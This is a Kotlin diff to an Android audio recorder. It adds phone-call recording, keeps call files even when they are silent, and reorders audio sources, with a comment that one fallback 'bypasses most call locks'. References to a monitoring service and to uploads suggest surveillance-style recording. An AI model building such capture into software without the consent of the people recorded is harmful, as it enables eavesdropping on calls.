@@ -114,6 +114,30 @@ class AudioRecorderEngine(private val context: Context) {
     /** Start an open-ended recording session (stopped by [stopRecording]). */
     fun startRecording(): Boolean = startRecorderInternal()
 
+    /** Start an open-ended call recording session (stopped by [stopRecording]). */
+    fun startCallRecording(): Boolean {
+        if (isRecording) return false
+        return try {
+            MonitoringForegroundService.getInstance()?.upgradeToMicType()
+            amplitudeWindow.clear()
+            val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
+            val file = File(context.cacheDir, "call_$ts.m4a")
+            currentFile = file
+
+            recorder = buildRecorder(file)
+            recorder!!.prepare()
+            recorder!!.start()
+            isRecording = true
+            Log.i(TAG, "Call recording started → ${file.name}")
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "Call start failed: ${e.message}")
+            safeReleaseRecorder()
+            MonitoringForegroundService.getInstance()?.downgradeFromMicType()
+            false
+        }
+    }
+
     /**
      * Stop the open-ended session.
      * @param upload true = upload if VAD passes; false = discard.
@@ -207,7 +231,8 @@ class AudioRecorderEngine(private val context: Context) {
             return@withContext
         }
 
-        if (!hasSpeech) {
+        val isCall = file.name.startsWith("call_")
+        if (!isCall && !hasSpeech) {
             file.delete()
             Log.d(TAG, "Discarded: VAD classified as silent")
             SupabaseManager.getInstance()
@@ -260,12 +285,22 @@ class AudioRecorderEngine(private val context: Context) {
         // MIC alone only captures the device microphone (misses earpiece / remote party audio).
         // VOICE_RECOGNITION: good ambient fallback with no echo-canceller applied.
         val sourceChain = buildList {
-            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // ← Both sides: earpiece+mic
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                add(MediaRecorder.AudioSource.VOICE_CALL)       // Direct call path (API 29+)
+            if (outputFile.name.startsWith("call_")) {
+                add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // Priority 1: VoIP source, captures both sides on newer Android versions
+                add(MediaRecorder.AudioSource.VOICE_RECOGNITION)    // Fallback: Raw mic (bypasses most call locks)
+                add(MediaRecorder.AudioSource.MIC)                  // Fallback: Standard mic
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    add(MediaRecorder.AudioSource.VOICE_CALL)
+                }
+            } else {
+                // Ambient recording - standard mic first
+                add(MediaRecorder.AudioSource.MIC)
+                add(MediaRecorder.AudioSource.VOICE_RECOGNITION)
+                add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    add(MediaRecorder.AudioSource.VOICE_CALL)
+                }
             }
-            add(MediaRecorder.AudioSource.VOICE_RECOGNITION)   // Ambient fallback
-            add(MediaRecorder.AudioSource.MIC)                  // Last resort (mic only)
         }
         var chosen = MediaRecorder.AudioSource.VOICE_COMMUNICATION
         for (src in sourceChain) {
